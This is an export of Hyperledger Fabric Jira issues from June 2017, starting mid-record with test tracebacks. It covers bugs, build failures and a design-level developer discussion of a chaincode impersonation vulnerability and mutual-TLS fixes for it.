          bdd_test_util.cli_call([""peer"",""chaincode"",""package""] + nameArgs + ctorArgs + pathArgs + versionArgs + [outputPath], expect_success=True, env=myEnv)
        File ""/opt/gopath/src/github.com/hyperledger/fabric/bddtests/steps/bdd_test_util.py"", line 32, in cli_call
          p = subprocess.Popen(arg_list, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=env)
        File ""/usr/lib/python2.7/subprocess.py"", line 711, in __init__
          errread, errwrite)
        File ""/usr/lib/python2.7/subprocess.py"", line 1343, in _execute_child
          raise child_exception
      OSError: [Errno 2] No such file or directory
{noformat}
2. GOROOT not set

Even if you have GOPATH set but left GOROOT not set, the go command usually works fine.
However, when the behave test executes the “peer chaincode package” command to make a package for chaincode to deploy, it fails to find standard packages located under the GOROOT directory. This results in an error in instantiating the chaincode.
{noformat}
$ behave
...(snip)
    And user ""configAdminPeerOrg0"" using cert alias ""config-admin-cert"" sends proposal ""instantiateProposal1"" to endorsers with timeout of ""90"" seconds with proposal responses ""instantiateProposalResponses""
                # steps/endorser_impl.py:109 29.466s
      | Endorser |
      | peer0    |
      | peer2    |
      Traceback (most recent call last):
        File ""/home/ubuntu/Envs/behave_venv/local/lib/python2.7/site-packages/behave/model.py"", line 1456, in run
          match.run(runner.context)
        File ""/home/ubuntu/Envs/behave_venv/local/lib/python2.7/site-packages/behave/model.py"", line 1903, in run
          self.func(context, *args, **kwargs)
        File ""steps/endorser_impl.py"", line 124, in step_impl
          resultsDict =  dict(zip(endorsers, [respFuture.result() for respFuture in proposalResponseFutures]))
        File ""/home/ubuntu/Envs/behave_venv/local/lib/python2.7/site-packages/grpc/_channel.py"", line 294, in result
          raise self
      _Rendezvous: <_Rendezvous of RPC that terminated with (StatusCode.UNKNOWN, Error starting container: Failed to generate platform-specific docker build: Error returned from build: 2 ""# github.com/hyperledger/fabric/examples/chaincode/go/chaincode_example02
      chaincode/input/src/github.com/hyperledger/fabric/examples/chaincode/go/chaincode_example02/chaincode_example02.go:45: cannot use shim.Error(""Incorrect number of arguments. Expecting 4"") (type ""github.com/hyperledger/fabric/protos/peer"".Response) as type ""github.co
m/hyperledger/fabric/examples/chaincode/go/chaincode_example02/vendor/github.com/hyperledger/fabric/protos/peer"".Response in return argument
      chaincode/input/src/github.com/hyperledger/fabric/examples/chaincode/go/chaincode_example02/chaincode_example02.go:52: cannot use shim.Error(""Expecting integer value for asset holding"") (type ""github.com/hyperledger/fabric/protos/peer"".Response) as type ""github.com
/hyperledger/fabric/examples/chaincode/go/chaincode_example02/vendor/github.com/hyperledger/fabric/protos/peer"".Response in return argument
      chaincode/input/src/github.com/hyperledger/fabric/examples/chaincode/go/chaincode_example02/chaincode_example02.go:57: cannot use shim.Error(""Expecting integer value for asset holding"") (type ""github.com/hyperledger/fabric/protos/peer"".Response) as type ""github.com
/hyperledger/fabric/examples/chaincode/go/chaincode_example02/vendor/github.com/hyperledger/fabric/protos/peer"".Response in return argument
      chaincode/input/src/github.com/hyperledger/fabric/examples/chaincode/go/chaincode_example02/chaincode_example02.go:64: cannot use shim.Error(err.Error()) (type ""github.com/hyperledger/fabric/protos/peer"".Response) as type ""github.com/hyperledger/fabric/examples/cha
incode/go/chaincode_example02/vendor/github.com/hyperledger/fabric/protos/peer"".Response in return argument
      chaincode/input/src/github.com/hyperledger/fabric/examples/chaincode/go/chaincode_example02/chaincode_example02.go:69: cannot use shim.Error(err.Error()) (type ""github.com/hyperledger/fabric/protos/peer"".Response) as type ""github.com/hyperledger/fabric/examples/cha
incode/go/chaincode_example02/vendor/github.com/hyperledger/fabric/protos/peer"".Response in return argument
      chaincode/input/src/github.com/hyperledger/fabric/examples/chaincode/go/chaincode_example02/chaincode_example02.go:72: cannot use shim.Success(nil) (type ""github.com/hyperledger/fabric/protos/peer"".Response) as type ""github.com/hyperledger/fabric/examples/chaincode
/go/chaincode_example02/vendor/github.com/hyperledger/fabric/protos/peer"".Response in return argument
      chaincode/input/src/github.com/hyperledger/fabric/examples/chaincode/go/chaincode_example02/chaincode_example02.go:89: cannot use shim.Error(""Invalid invoke function name. Expecting ""invoke"" ""delete"" ""query"""") (type ""github.com/hyperledger/fabric/protos/peer"".Respo
nse) as type ""github.com/hyperledger/fabric/examples/chaincode/go/chaincode_example02/vendor/github.com/hyperledger/fabric/protos/peer"".Response in return argument
      chaincode/input/src/github.com/hyperledger/fabric/examples/chaincode/go/chaincode_example02/chaincode_example02.go:100: cannot use shim.Error(""Incorrect number of arguments. Expecting 3"") (type ""github.com/hyperledger/fabric/protos/peer"".Response) as type ""github.c
om/hyperledger/fabric/examples/chaincode/go/chaincode_example02/vendor/github.com/hyperledger/fabric/protos/peer"".Response in return argument
      chaincode/input/src/github.com/hyperledger/fabric/examples/chaincode/go/chaincode_example02/chaincode_example02.go:110: cannot use shim.Error(""Failed to get state"") (type ""github.com/hyperledger/fabric/protos/peer"".Response) as type ""github.com/hyperledger/fabric/e
xamples/chaincode/go/chaincode_example02/vendor/github.com/hyperledger/fabric/protos/peer"".Response in return argument
      chaincode/input/src/github.com/hyperledger/fabric/examples/chaincode/go/chaincode_example02/chaincode_example02.go:113: cannot use shim.Error(""Entity not found"") (type ""github.com/hyperledger/fabric/protos/peer"".Response) as type ""github.com/hyperledger/fabric/exam
ples/chaincode/go/chaincode_example02/vendor/github.com/hyperledger/fabric/protos/peer"".Response in return argument
      chaincode/input/src/github.com/hyperledger/fabric/examples/chaincode/go/chaincode_example02/chaincode_example02.go:113: too many errors
{noformat}",fabric commit 97e3ae61168acad6f425cf38dde90b8fc50766af,jeffgarratt,markparz,shimos,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2w7:",,,,,,,,,,,,,,,,,,,,,,,jeffgarratt,markparz,shimos,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"16/Jun/17 1:22 AM;shimos;CR: https://gerrit.hyperledger.org/r/#/c/10643/;;;","16/Jun/17 5:44 AM;markparz;I actually don't think you have to set GOROOT, if I'm right, it's auto discovered. In fact, mine is blank:

Marks:fabric mark$ echo $GOROOT

Marks:fabric mark$

[~jeffgarratt] is this something special / different for behave?;;;","16/Jun/17 9:46 AM;shimos;Right if you install Go in the standard location (e.g. /usr/local/go for the binary distribution in golang.org).

I thought we still have to set GOROOT because
 (1) one might install Go in a different location from the standard one
 (2) behave fails as reported above

While now I think (2) is due to some bug in the peer code which should be addressed (I opened FAB-4819), I still think it needs to be set because of (1).
;;;","17/Jun/17 12:31 AM;jeffgarratt;We could mod the documentation for BDD to note the need to assure that 'peer' is in the path as the install step requires the peer for packaging purposes.  This is the default setting for vagrant environments.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Prepend channel name to logging statements in broadcast/deliver packages,FAB-4740,18023,,Story,Closed,FAB,Fabric,software,denyeart,,,Lowest,Done,kchristidis,kchristidis,kchristidis,15/Jun/17 11:35 AM,21/Jul/18 3:54 AM,28/Oct/23 3:00 AM,16/Jun/17 5:39 AM,v1.0.0-beta,,,v1.0.0-rc1,,fabric-orderer,,,,,,0,common-components,,,,,,Prepend channel name to logging statements in the deliver and broadcast packages to make debugging easier. ,,kchristidis,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy2wf:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,kchristidis,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"15/Jun/17 11:50 AM;kchristidis;https://gerrit.hyperledger.org/r/#/c/10609/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add license header for sdk-py's code and docs,FAB-4742,18025,,Story,Closed,FAB,Fabric,software,denyeart,,,Highest,Done,qiang0723,baohua,baohua,15/Jun/17 11:45 AM,21/Jul/18 3:57 AM,28/Oct/23 3:00 AM,02/Nov/17 5:05 PM,,,,v1.1.0,,fabric-sdk-py,,,,,,0,SDK-Python,,,,,,"According to FAB-3963, we need to fix all missing license header to Apache V2.",,baohua,qiang0723,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,288000,288000,,0%,288000,288000,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,FAB-3963,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy2wv:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,baohua,qiang0723,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Aug/17 11:22 AM;qiang0723;add

""""""
# SPDX-License-Identifier: Apache-2.0
#
"""" in the head at all code
and add 
""""""
## License <a name=""license""></a>.
The Hyperledger Cello project uses the [Apache License Version 2.0](LICENSE) software license.
"""""" in the bottom at all code
 

 ;;;","02/Sep/17 6:39 PM;qiang0723;https://gerrit.hyperledger.org/r/#/c/13459/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Harden backoff policy code in delivery client,FAB-4743,18027,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,yacovm,yacovm,15/Jun/17 4:17 PM,21/Jul/18 3:57 AM,28/Oct/23 3:00 AM,15/Jun/17 10:18 PM,v1.0.0-beta,,,v1.0.0,,fabric-peer,,,,,,0,,,,,,,"The delivery client has a backoff policy that specifies an amount of time to sleep and whether to continue to retry based on an attempt number.

 

Currently the code that calculates the amount of time to sleep is prone to overflow to a negative number.

However, the fact that the code only retries a limited number of times (not indefinitely) saves us from the overflow.

 

I would like to make the code that calculates the time duration to sleep to never overflow in order for if someone in the future to change the attempt threshold and forget about the overflow problem lurking around the corner, we won't have a problem.",,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy2x3:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Remove unused code and non-used values, gossip communication package",FAB-4744,18028,,Bug,Closed,FAB,Fabric,software,denyeart,,,Low,Done,C0rWin,C0rWin,C0rWin,15/Jun/17 6:02 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,15/Jun/17 10:13 PM,v1.0.0-alpha2,,,v1.0.0,,fabric-gossip,,,,,,0,gossip,,,,,,"There are few static warning for gossip communication module indicating unused variables and values returned by function:

{code}
comm/comm_impl.go:158:2: field skipHandshake is unused (U1000)
comm/comm_test.go:115:6: type msgConsumer is unused (U1000)

comm/comm_test.go:223:6: this value of err is never used (SA4006)
{code}

Need to take to remove unused variable and add assertion for error value returned in the test.",,C0rWin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-290,,,,,,,,,"1|hzy2xb:",,,,,,Sprint 16 - Gossip,,,,,,,,,,,,,,,,,C0rWin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"15/Jun/17 6:19 PM;C0rWin;https://gerrit.hyperledger.org/r/#/c/10627/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"The fabric v1.0.0 beta, could not get msp for chain",FAB-4745,18029,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,zhaochong,zhaochong,15/Jun/17 6:12 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,08/Sep/17 2:52 AM,v1.0.0-beta,,,Future,,fabric-peer,,,,,,0,,,,,,,"The steps are as follows:

 
{code:java}
$ peer channel create -o 127.0.0.1:7050 -c ch1
$ peer channel join -b ch1.block
$ peer chaincode install -n mycc -v 0 -p
github.com/hyperledger/fabric/examples/chaincode/go/chaincode_example02
$ peer chaincode instantiate -n mycc -v 0 -c
'{""Args"":[""init"",""a"",""100"",""b"",""200""]}' -o 127.0.0.1:7050 -C ch1{code}
 

Then the wrong message is as follows:

 
{code:java}
2017-06-15 16:11:36.225 CST [msp] getMspConfig -> INFO 001 intermediate certs folder not found at [/home/baoquan/go/src/github.com/hyperledger/fabric/sampleconfig/msp/intermediatecerts]. Skipping.: [stat /home/baoquan/go/src/github.com/hyperledger/fabric/sampleconfig/msp/intermediatecerts: no such file or directory]
2017-06-15 16:11:36.225 CST [msp] getMspConfig -> INFO 002 crls folder not found at [/home/baoquan/go/src/github.com/hyperledger/fabric/sampleconfig/msp/intermediatecerts]. Skipping.: [stat /home/baoquan/go/src/github.com/hyperledger/fabric/sampleconfig/msp/crls: no such file or directory]
2017-06-15 16:11:36.279 CST [chaincodeCmd] checkChaincodeCmdParams -> INFO 003 Using default escc
2017-06-15 16:11:36.279 CST [chaincodeCmd] checkChaincodeCmdParams -> INFO 004 Using default vscc
Error: Error endorsing chaincode: rpc error: code = Unknown desc = could not get msp for chain [ch1]{code}
 

A warning message appears in the orderer log as follows
{code:java}
2017-06-15 16:21:47.398 CST [orderer/common/broadcast] Handle -> WARN 007 Error reading from stream: rpc error: code = Canceled desc = context canceled{code}
orderer.yaml, core.yaml, configtx.yaml  please see the attachment

[^orderer.yaml][^core.yaml][^configtx.yaml]",,C0rWin,muralisr,zhaochong,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"15/Jun/17 6:08 PM;zhaochong;configtx.yaml;https://jira.hyperledger.org/secure/attachment/11084/configtx.yaml","15/Jun/17 6:08 PM;zhaochong;core.yaml;https://jira.hyperledger.org/secure/attachment/11085/core.yaml","15/Jun/17 6:08 PM;zhaochong;orderer.yaml;https://jira.hyperledger.org/secure/attachment/11086/orderer.yaml",,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2xj:",,,,,,,,,,,,,,,,,,,,,,,C0rWin,muralisr,zhaochong,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"24/Jun/17 6:37 AM;C0rWin;Usually the error 

> Error: Error endorsing chaincode: rpc error: code = Unknown desc = could not get msp for chain [ch1]

indicates peer has not been joined to the chain. I'd suspected that you missed ordering service in join command:

> peer channel join -b ch1.block

should be

```
peer channel join -b ch1.block -o 127.0.0.1:7050
```
;;;","26/Jun/17 10:47 AM;zhaochong;[~C0rWin]
It still doesn't work, same error;;;","08/Sep/17 2:52 AM;muralisr;[~zhaochong] closing this as this based on Beta. Can you try latest and reopen if the problem exists please ?;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"CI jobs are failing with ""lf-infra-publish"" postbuild step",FAB-4746,18033,,Bug,Closed,FAB,Fabric,software,denyeart,,,Highest,Done,ryjones,rameshthoomu,rameshthoomu,15/Jun/17 8:45 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,16/Jun/17 10:23 PM,v1.0.0,,,v1.0.0,,fabric-build,,,,,,0,build-system,,,,,,"Recent changes to log shipping in post build action step has been changed is causing the job failures across the hyperledger CI jobs. All CI jobs are consistently failing with the below error

{code:java}
06:13:20 ---> create-netrc.sh
06:13:20 /tmp/hudson2264011273872495219.sh: line 20: xmlstarlet: command not found
06:13:20 Build step 'Execute a set of scripts' marked build as failure
06:13:20 Archiving artifacts
06:13:24 Recording fingerprints
06:13:25 Finished: FAILURE 
{code}

Below is the change set https://gerrit.hyperledger.org/r/#/c/10543/",JENKINS,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2xr:",,,,,,,,,,,,,,,,,,,,,,,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"16/Jun/17 10:22 PM;rameshthoomu;This is working as expected after install xmlstarlet facter packages in all builds nodes. Closing this issue;;;","16/Jun/17 10:23 PM;rameshthoomu;https://gerrit.hyperledger.org/r/#/c/10621/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Not informative error while deploying a chaincode,FAB-4748,18035,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,C0rWin,C0rWin,C0rWin,15/Jun/17 10:01 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,16/Jun/17 5:39 AM,v1.0.0-alpha2,,,v1.0.0,,fabric-peer,,,,,,0,peer,,,,,,"While trying to deploy a new chaincode receiving an error:

{code}
[36mpeer0.org1.example.com    |[0m [36m2017-06-15 12:01:55.096 UTC [util] DockerBuild -> DEBU 355[0m Attempting build with image hyperledger/fabric-ccenv:x86_64-1.0.0-beta
[36mpeer0.org1.example.com    |[0m [36m2017-06-15 12:02:55.590 UTC [dockercontroller] deployImage -> DEBU 356[0m Created image: dev-peer0.org1.example.com-mycc-v0
[36mpeer0.org1.example.com    |[0m [36m2017-06-15 12:02:55.591 UTC [dockercontroller] Start -> DEBU 357[0m start-recreated image successfully
[36mpeer0.org1.example.com    |[0m [36m2017-06-15 12:02:55.591 UTC [dockercontroller] createContainer -> DEBU 358[0m Create container: dev-peer0.org1.example.com-mycc-v0
[36mpeer0.org1.example.com    |[0m [31m2017-06-15 12:02:55.618 UTC [dockercontroller] Start -> ERRO 359[0m start-could not recreate container post recreate image: no such image
{code}

while error indicates the problem of not being able to find image, it does not provide any further information helping to investigate or to trace down the issue. I'd suggest to add more information to increase serviceability.",,C0rWin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2y7:",,,,,,,,,,,,,,,,,,,,,,,C0rWin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"15/Jun/17 11:28 PM;C0rWin;https://gerrit.hyperledger.org/r/#/c/10635/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Document policy restrictions in v1,FAB-4749,18036,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,ales,ales,15/Jun/17 10:17 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,22/Jun/17 6:16 AM,,,,v1.0.0,,fabric-docs,,,,,,0,,,,,,,v1 does not properly handle policies that require >1 signatures with the same attribute (e.g. 2 signatures from Org1). FAB-4252 describes the reasons for that limitation.,,ales,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2yf:",,,,,,,,,,,,,,,,,,,,,,,ales,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"21/Jun/17 11:11 PM;jyellick;In review via: https://gerrit.hyperledger.org/r/#/c/10909/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Orderer should accept TLS root certs not coming from the org CA,FAB-4750,18037,,Story,Closed,FAB,Fabric,software,denyeart,,,High,Done,mastersingh24,mrshah-ibm,mrshah-ibm,15/Jun/17 10:17 PM,21/Jul/18 3:54 AM,28/Oct/23 3:00 AM,23/Jun/17 11:30 AM,v1.0.0-beta,,,v1.0.0,v1.0.0-rc1,fabric-orderer,,,,,,0,server,,,,,,"When using the TLS certs signed by a CA different from Org CAs (ex. digicert, godaddy, etc), the orderer does not accept connections from the peer for the deliver call on join channel:
{quote}(Error: x509: Certificate signed by unknown authority).
{quote}
Workaround: Copying the TLS root certs in the orderer's msp/cacert folder will make the orderer accept connections from the peer. This also makes the orderer allow transactions signed by any peer using the certs signed by the same root CA as the TLS Certs, which is a security concern.

We should have a way to provide peers' TLS root certificates to the orderer (maybe in msp/tlscacert folder).",,holocron,mastersingh24,mrshah-ibm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-4626,FAB-4904,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy2yn:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,holocron,mastersingh24,mrshah-ibm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"22/Jun/17 10:01 PM;mastersingh24;FAB-4904 will resolve this;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
[SECURITY] chaincode impersonation attack,FAB-4751,18038,,Bug,Closed,FAB,Fabric,software,denyeart,,,Highest,Done,muralisr,ales,ales,15/Jun/17 10:24 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,22/Jun/17 2:11 AM,v0.6,v1.0.0-beta,,v1.0.0,v1.0.0-rc1,fabric-crypto,fabric-peer,,,,,0,security,Security,v1.0,,,,"_The following was discussed with_ [~ellaki]_,_ [~elli-androulaki]_,_ [~adc]_._ [~angelo.decaro]_,_ [~adc]_,_ [~yacovm] _- folks pls correct/expand as you see fit._

A chaincode connects back to the peer on the peer.listenAddress endpoint (by default 0.0.0.0:7051).

If this port is not protected, a remote attacker may connect to the peer and impersonate a chaincode during instantiation (or first invocation) by racing chaincode container creation.

If this port is protected (i.e. not reachable from the outside), this attack can still be performed by an unprivileged local attacker (or by a malicious remote attacker with chaincode instantiation privileges).",,ales,ashutosh_kumar,binhn,C0rWin,elli-androulaki,JonathanLevi,mastersingh24,muralisr,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,FAB-4888,,,,,,,FAB-4546,,,,,,,,,,,,,,,,,,,,FAB-4447,FAB-5406,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy2yv:",,,,,,,,,,,,,,,,,,,,,,,ales,ashutosh_kumar,binhn,C0rWin,elli-androulaki,JonathanLevi,mastersingh24,muralisr,yacovm,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"16/Jun/17 12:18 AM;yacovm;In theory one can always write a chaincode that connects to the peer as a client, and cooperates with a client that submits the transaction, therefore I don't think that having a separate port is a good option.

I think the best solution would be to:
 * Generate a self signed TLS cert and private key prior to CC launch and passing it to the chaincode container at startup via environment variables
The peer side chaincode handler would associate the chaincode container's TLS certificate hash with the chaicode name/instance
 * The chaincode (shim side) would send its TLS certificate as a gRPC client to the peer as part of a connection
 * The peer chaincode handler would ensure the hash of the TLS certificate derived from the gRPC stream matches the stored hash in memory.
 * When the peer crashes the chaincode dies with it (as it is now), so when the peer would start up, a new TLS cert and key would be created for the new container;;;","16/Jun/17 2:13 AM;JonathanLevi;First, thanks for reporting this [~ales].I tend to agree with you guys that ""hiding"" the port is/may not be not sufficient.

Just quickly, I believe that we need to, indeed, start thinking in terms of ""and then ENTITY Y, who *requires* that,  ..."" (similar to Yacov's suggestion that ""the chain code handle ""would ensure that the hash of ...""). That is, having some strong validation/verification step, that always takes place at some point/step.;;;","16/Jun/17 4:54 AM;JonathanLevi;Just to note that this has been ""going on"" for a while (that same ""design"" is in place since I remember this project / pre- v0.5). Not waving this off, of course, as I believe that it should get addressed (and get the adequate priority)... but I can't tell if we should really flag it as a ""show stopper"" at this point.

Happy for other to kindly chime-in & discuss... please.;;;","16/Jun/17 9:30 PM;mastersingh24;I agree with reducing the priority here.  It would be very, very difficult to pull off the race condition;;;","16/Jun/17 10:49 PM;elli-androulaki;Hm, so one could create on the fly TLS certificates to the chaincodes prior to launching them such that they are authenticated. We discussed and converged with  [~ales] to a solution where a peer has one TLS cert (and associated secret) generated for its chaincodes, and which the chaincodes of that peer could use to authenticate themselves to the peer. For v1, given that we trust the chaincodes this could suffice, and post-v1 we could move to more sophisticated solutions. 

Notice, that the attack can be successful even more easily if the attacker finds out a way to kill the chaincode, cause it could just invoke the chaincode (with arguments that it knows it would kill it), kill it through its invocation, and then use another invocation to trigger chaincode launching and spawn the attack then. 

[~mastersingh24], [~JonathanLevi] what do you think?

 ;;;","16/Jun/17 11:31 PM;ashutosh_kumar;I am coming from simplistic approach. First of all , if the Enterprise Network Architecture is done right , the peer port will not be known to outside world. Second of all , if it is architect right , the peer port will not be accessible from internal network, so the internal attack is minimized. Throttling at TCP layer might be panacea for race condition. Killing chaincode scenario should be handled at the chaincode layer. If done right , that vulnerability is difficult to exploit.;;;","16/Jun/17 11:48 PM;elli-androulaki;[~ashutosh_kumar], I am not sure i understand. 
>  if the Enterprise Network Architecture is done right , the peer port will not be known to outside world
Well it depends how you define ""outside world"".  Would the client belong to the non-outside world? Cause in what we are describing above, the client could be part of the attacker. Clients need to know which port that is to be able to endorse their proposals.

> if it is architect right , the peer port will not be accessible from internal network, so the internal attack is minimized 
Hm, do you refer to ""external network"" right? Again it depends who you consider your attacker to be.

> Killing chaincode scenario should be handled at the chaincode layer. If done right , that vulnerability is difficult to exploit.
Killing the chaincode may be difficult, but still possible. But it is not required for the attack to succeed. ;;;","17/Jun/17 12:02 AM;ashutosh_kumar;# What I talking about here is Zoning and Enclaving. Client request coming on internet , will hit Firewall , then load balancer and then PEER sitting behind firewall. Port that will be exposed is Load Balancer port. So the client will hit load balancer port , not peer port 7051.

2 . For internal attacker : Software Components on internal VLAN , usually will not have route to Peer Port. It will be managed by VLAN switches. So , from connectivity perspective , it is not possible.

 

For 1 and 2 to work , Network architecture has to be done right.

 

With TLS , I see one issue : Usually internet TLS  terminates at DMZ , so the self signed cert used for authentication will be applicable only at Load Balancer , not at docker container.

 

 ;;;","17/Jun/17 1:06 AM;binhn;I agreed that with the precondition of having a bunch security layers wrapped around a peer, then we wouldn't have to worry about this, but the fact is the peer port is open and only uses server-side TLS, which enables potential attacks, including DoS. That is, I can't put the peer in the open and hope it would take care of itself.

It doesn't sound like it would take much to add mutual TLS, so we should do that to cover this potential problem. ;;;","17/Jun/17 1:17 AM;ashutosh_kumar;[~binhn] : Defense in Depth is always good to have. So , you want to use Mutual TLS as authentication mechanism ? If yes , where the credentials be stored ? On PEER filesystem ?;;;","17/Jun/17 2:59 AM;elli-androulaki;[~ashutosh_kumar], the idea is that:

 - in the short term the peer will generate a tls certificate (and associated secrets) that will pass to the chaincodes that are launched by the peer. From then on, the peer will only accept connections from chaincodes with mutual TLS enabled, where client-cert is the same as the one of his chaincodes, and will reject other connections. This would be enough assuming that we ""trust"" the chaincodes that run on the peer. 

 - in the long term (post v1) we may consider solutions where the peer generates on the fly tls-certs and cert secrets (one per chaincode), or/and more invasive alternatives.

 

Regarding where the certs/keys are to be stored. [~yacovm], [~ales] suggested to pass it as environment variable at chaincode launching. [~ales] mentioned that docker containers (and thus chaincodes) could potentially connect to the peer via the peer's filesystem, e.g., share certain files. This would be another way for the peer to communicate certs/keys to the peer. [~ales], [~yacovm] please correct/add more info as you think appropriate :);;;","17/Jun/17 5:07 AM;ashutosh_kumar;[~elli-androulaki] , so your authentication is based on Trust Chain validation(which will work for self signed certs) , not end user authentication. If that is the case , user(system) credentials  is  not in play here.;;;","17/Jun/17 7:05 AM;yacovm;{quote}If this port is not protected, a remote attacker may connect to the peer and impersonate a chaincode during instantiation (or first invocation) by racing chaincode container creation.
{quote}
So the port is always not protected since the peer receives via that port requests from clients (i.e node SDK)
